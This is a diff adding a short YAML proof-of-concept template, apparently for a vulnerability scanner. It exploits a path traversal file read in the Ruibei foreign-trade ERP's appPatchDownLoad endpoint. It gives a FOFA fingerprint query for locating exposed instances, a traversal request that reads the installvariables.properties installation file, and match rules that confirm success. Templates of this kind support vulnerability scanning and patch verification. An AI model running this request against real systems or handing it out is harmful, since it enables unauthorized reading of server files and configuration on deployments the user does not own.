@@ -1,0 +1,24 @@
+id: poc-yaml-ruibei-foreign-trade-apppatchdownload-anyfile-read
+info:
+  name: 睿贝外贸ERP appPatchDownLoad 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 睿贝外贸ERP
+  fofa: body="loginNeedMobileNumVerification" || body="睿贝软件"
+requests:
+- method: GET
+  path: /appPatchDownLoad?fileName=../../../../RebeeCRM/_RebeeCRM_installation/installvariables.properties
+  expression: 'status_code == 200 &&
+
+    contains(body,"DESKTOP=") &&
+
+    contains(body,"SYSTEM=") &&
+
+    contains(headers,"filename=installvariables.properties") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
